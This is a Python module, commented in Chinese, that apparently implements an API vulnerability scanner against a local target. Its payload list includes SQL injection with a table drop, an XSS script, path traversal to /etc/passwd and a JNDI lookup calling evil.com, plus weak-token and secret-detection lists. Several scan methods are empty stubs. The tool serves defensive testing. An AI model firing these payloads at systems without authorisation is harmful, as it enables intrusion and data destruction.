"""
漏洞掃描工具

此模組實現自動化漏洞掃描功能，用於檢測 API 中的常見安全漏洞。

掃描範圍：
- OWASP Top 10 漏洞
- 輸入驗證漏洞
- 認證和授權漏洞
- 配置安全漏洞
- 資料洩露漏洞
"""

import logging
import json
import time
import requests
from datetime import datetime
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass
from enum import Enum

logger = logging.getLogger(__name__)


class VulnerabilityLevel(str, Enum):
    """漏洞嚴重程度"""

    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


@dataclass
class VulnerabilityResult:
    """漏洞掃描結果"""

    vulnerability_id: str
    name: str
    description: str
    level: VulnerabilityLevel
    endpoint: str
    method: str
    payload: Optional[str] = None
    response_code: Optional[int] = None
    response_time: Optional[float] = None
    evidence: Optional[str] = None
    recommendation: Optional[str] = None
    cve_id: Optional[str] = None
    owasp_category: Optional[str] = None


class VulnerabilityScanner:
    """漏洞掃描器類"""

    def __init__(self, base_url: str = "http://127.0.0.1:8000"):
        """
        初始化漏洞掃描器

        Args:
            base_url: API 基礎 URL
        """
        self.base_url = base_url.rstrip("/")
        self.session = requests.Session()
        self.results: List[VulnerabilityResult] = []

        # 掃描配置
        self.timeout = 10
        self.max_retries = 3
        self.delay_between_requests = 0.1

    def scan_all_vulnerabilities(
        self, endpoints: List[str], auth_token: Optional[str] = None
    ) -> List[VulnerabilityResult]:
        """
        執行完整漏洞掃描

        Args:
            endpoints: 要掃描的端點列表
            auth_token: 認證 Token

        Returns:
            List[VulnerabilityResult]: 掃描結果列表
        """
        self.results = []

        # 設置認證標頭
        if auth_token:
            self.session.headers.update({"Authorization": f"Bearer {auth_token}"})

        logger.info(f"開始漏洞掃描，目標: {self.base_url}")

        for endpoint in endpoints:
            logger.info(f"掃描端點: {endpoint}")

            # OWASP Top 10 掃描
            self._scan_injection_vulnerabilities(endpoint)
            self._scan_authentication_vulnerabilities(endpoint)
            self._scan_sensitive_data_exposure(endpoint)
            self._scan_xml_external_entities(endpoint)
            self._scan_broken_access_control(endpoint)
            self._scan_security_misconfiguration(endpoint)
            self._scan_xss_vulnerabilities(endpoint)
            self._scan_insecure_deserialization(endpoint)
            self._scan_known_vulnerabilities(endpoint)
            self._scan_insufficient_logging(endpoint)

            # 延遲避免過度負載
            time.sleep(self.delay_between_requests)

        logger.info(f"漏洞掃描完成，發現 {len(self.results)} 個問題")
        return self.results

    def _scan_injection_vulnerabilities(self, endpoint: str) -> None:
        """掃描注入漏洞 (A01:2021)"""
        injection_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "1' UNION SELECT NULL,NULL,NULL--",
            "<script>alert('xss')</script>",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",
            "<%=7*7%>",
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        ]

        for payload in injection_payloads:
            # 測試 GET 參數注入
            self._test_injection_in_params(endpoint, payload)

            # 測試 POST 資料注入
            self._test_injection_in_body(endpoint, payload)

    def _test_injection_in_params(self, endpoint: str, payload: str) -> None:
        """測試 GET 參數注入"""
        try:
            # 測試不同參數
            test_params = ["id", "search", "filter", "version", "name"]

            for param in test_params:
                url = f"{self.base_url}{endpoint}"
                params = {param: payload}

                start_time = time.time()
                response = self.session.get(url, params=params, timeout=self.timeout)
                response_time = time.time() - start_time

                # 檢查注入跡象
                if self._detect_injection_signs(response, payload):
                    self.results.append(
                        VulnerabilityResult(
                            vulnerability_id=f"INJ-001-{param}",
                            name="SQL/NoSQL 注入漏洞",
                            description=f"在參數 {param} 中檢測到潛在的注入漏洞",
                            level=VulnerabilityLevel.HIGH,
                            endpoint=endpoint,
                            method="GET",
                            payload=payload,
                            response_code=response.status_code,
                            response_time=response_time,
                            evidence=response.text[:500],
                            recommendation="使用參數化查詢和輸入驗證",
                            owasp_category="A03:2021 – Injection",
                        )
                    )

        except Exception as e:
            logger.error(f"參數注入測試失敗: {e}")

    def _test_injection_in_body(self, endpoint: str, payload: str) -> None:
        """測試 POST 資料注入"""
        try:
            url = f"{self.base_url}{endpoint}"

            # 測試 JSON 注入
            json_data = {
                "version": payload,
                "title": payload,
                "description": payload,
                "search": payload,
            }

            start_time = time.time()
            response = self.session.post(url, json=json_data, timeout=self.timeout)
            response_time = time.time() - start_time

            if self._detect_injection_signs(response, payload):
                self.results.append(
                    VulnerabilityResult(
                        vulnerability_id="INJ-002",
                        name="POST 資料注入漏洞",
                        description="在 POST 資料中檢測到潛在的注入漏洞",
                        level=VulnerabilityLevel.HIGH,
                        endpoint=endpoint,
                        method="POST",
                        payload=payload,
                        response_code=response.status_code,
                        response_time=response_time,
                        evidence=response.text[:500],
                        recommendation="驗證和清理所有輸入資料",
                        owasp_category="A03:2021 – Injection",
                    )
                )

        except Exception as e:
            logger.error(f"POST 注入測試失敗: {e}")

    def _detect_injection_signs(
        self, response: requests.Response, payload: str
    ) -> bool:
        """檢測注入攻擊跡象"""
        response_text = response.text.lower()

        # SQL 錯誤跡象
        sql_errors = [
            "sql syntax",
            "mysql_fetch",
            "ora-",
            "postgresql",
            "sqlite_",
            "sqlstate",
            "syntax error",
        ]

        # 系統錯誤跡象
        system_errors = [
            "root:",
            "administrator:",
            "windows\\system32",
            "/etc/passwd",
            "access denied",
        ]

        # 檢查錯誤跡象
        for error in sql_errors + system_errors:
            if error in response_text:
                return True

        # 檢查異常響應時間（可能的時間盲注）
        if response.elapsed.total_seconds() > 5:
            return True

        # 檢查載荷是否被直接回顯（可能的 XSS）
        if payload.lower() in response_text and "<script>" in payload.lower():
            return True

        return False

    def _scan_authentication_vulnerabilities(self, endpoint: str) -> None:
        """掃描認證漏洞 (A07:2021)"""
        # 測試無認證訪問
        self._test_unauthenticated_access(endpoint)

        # 測試弱認證
        self._test_weak_authentication(endpoint)

        # 測試會話管理
        self._test_session_management(endpoint)

    def _test_unauthenticated_access(self, endpoint: str) -> None:
        """測試無認證訪問"""
        try:
            # 移除認證標頭
            original_headers = self.session.headers.copy()
            if "Authorization" in self.session.headers:
                del self.session.headers["Authorization"]

            url = f"{self.base_url}{endpoint}"
            response = self.session.get(url, timeout=self.timeout)

            # 如果返回 200，可能存在認證繞過
            if response.status_code == 200:
                self.results.append(
                    VulnerabilityResult(
                        vulnerability_id="AUTH-001",
                        name="認證繞過漏洞",
                        description="端點可能允許無認證訪問",
                        level=VulnerabilityLevel.HIGH,
                        endpoint=endpoint,
                        method="GET",
                        response_code=response.status_code,
                        evidence="無認證情況下返回 200 狀態碼",
                        recommendation="確保所有敏感端點都需要適當的認證",
                        owasp_category="A07:2021 – Identification and Authentication Failures",
                    )
                )

            # 恢復認證標頭
            self.session.headers.update(original_headers)

        except Exception as e:
            logger.error(f"無認證訪問測試失敗: {e}")

    def _test_weak_authentication(self, endpoint: str) -> None:
        """測試弱認證"""
        weak_tokens = [
            "Bearer admin",
            "Bearer password",
            "Bearer 123456",
            "Bearer token",
            "Bearer test",
            "Bearer null",
            "Bearer undefined",
        ]

        for weak_token in weak_tokens:
            try:
                headers = {"Authorization": weak_token}
                url = f"{self.base_url}{endpoint}"
                response = self.session.get(url, headers=headers, timeout=self.timeout)

                if response.status_code == 200:
                    self.results.append(
                        VulnerabilityResult(
                            vulnerability_id="AUTH-002",
                            name="弱認證漏洞",
                            description="系統接受弱認證憑證",
                            level=VulnerabilityLevel.MEDIUM,
                            endpoint=endpoint,
                            method="GET",
                            payload=weak_token,
                            response_code=response.status_code,
                            evidence=f"弱 Token {weak_token} 被接受",
                            recommendation="實施強認證機制和 Token 驗證",
                            owasp_category="A07:2021 – Identification and Authentication Failures",
                        )
                    )

            except Exception as e:
                logger.error(f"弱認證測試失敗: {e}")

    def _scan_sensitive_data_exposure(self, endpoint: str) -> None:
        """掃描敏感資料暴露 (A02:2021)"""
        try:
            url = f"{self.base_url}{endpoint}"
            response = self.session.get(url, timeout=self.timeout)

            # 檢查響應中的敏感資料
            sensitive_patterns = [
                r"password",
                r"secret",
                r"api[_-]?key",
                r"token",
                r"private[_-]?key",
                r"credit[_-]?card",
                r"ssn",
                r"social[_-]?security",
            ]

            response_text = response.text.lower()
            for pattern in sensitive_patterns:
                if pattern in response_text:
                    self.results.append(
                        VulnerabilityResult(
                            vulnerability_id="DATA-001",
                            name="敏感資料暴露",
                            description=f"響應中可能包含敏感資料: {pattern}",
                            level=VulnerabilityLevel.MEDIUM,
                            endpoint=endpoint,
                            method="GET",
                            response_code=response.status_code,
                            evidence=f"檢測到模式: {pattern}",
                            recommendation="移除響應中的敏感資料，實施資料分類",
                            owasp_category="A02:2021 – Cryptographic Failures",
                        )
                    )

        except Exception as e:
            logger.error(f"敏感資料暴露掃描失敗: {e}")

    def generate_scan_report(self, output_format: str = "json") -> str:
        """
        生成掃描報告

        Args:
            output_format: 輸出格式 (json, html, txt)

        Returns:
            str: 報告內容或檔案路徑
        """
        if output_format == "json":
            return self._generate_json_report()
        elif output_format == "html":
            return self._generate_html_report()
        elif output_format == "txt":
            return self._generate_text_report()
        else:
            raise ValueError(f"不支援的輸出格式: {output_format}")

    def _generate_json_report(self) -> str:
        """生成 JSON 格式報告"""
        report_data = {
            "scan_info": {
                "target": self.base_url,
                "scan_time": datetime.now().isoformat(),
                "total_vulnerabilities": len(self.results),
                "severity_summary": self._get_severity_summary(),
            },
            "vulnerabilities": [
                {
                    "id": result.vulnerability_id,
                    "name": result.name,
                    "description": result.description,
                    "level": result.level.value,
                    "endpoint": result.endpoint,
                    "method": result.method,
                    "payload": result.payload,
                    "response_code": result.response_code,
                    "response_time": result.response_time,
                    "evidence": result.evidence,
                    "recommendation": result.recommendation,
                    "owasp_category": result.owasp_category,
                }
                for result in self.results
            ],
        }

        filename = f"vulnerability_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, "w", encoding="utf-8") as f:
            json.dump(report_data, f, ensure_ascii=False, indent=2)

        return filename

    def _get_severity_summary(self) -> Dict[str, int]:
        """獲取嚴重程度統計"""
        summary = {level.value: 0 for level in VulnerabilityLevel}
        for result in self.results:
            summary[result.level.value] += 1
        return summary

    # 其他掃描方法的簡化實現
    def _scan_xml_external_entities(self, endpoint: str) -> None:
        """掃描 XXE 漏洞"""
        pass

    def _scan_broken_access_control(self, endpoint: str) -> None:
        """掃描訪問控制漏洞"""
        pass

    def _scan_security_misconfiguration(self, endpoint: str) -> None:
        """掃描安全配置錯誤"""
        pass

    def _scan_xss_vulnerabilities(self, endpoint: str) -> None:
        """掃描 XSS 漏洞"""
        pass

    def _scan_insecure_deserialization(self, endpoint: str) -> None:
        """掃描不安全反序列化"""
        pass

    def _scan_known_vulnerabilities(self, endpoint: str) -> None:
        """掃描已知漏洞"""
        pass

    def _scan_insufficient_logging(self, endpoint: str) -> None:
        """掃描日誌記錄不足"""
        pass

    def _test_session_management(self, endpoint: str) -> None:
        """測試會話管理"""
        pass

    def _generate_html_report(self) -> str:
        """生成 HTML 格式報告"""
        return "vulnerability_report.html"

    def _generate_text_report(self) -> str:
        """生成文字格式報告"""
        return "vulnerability_report.txt"
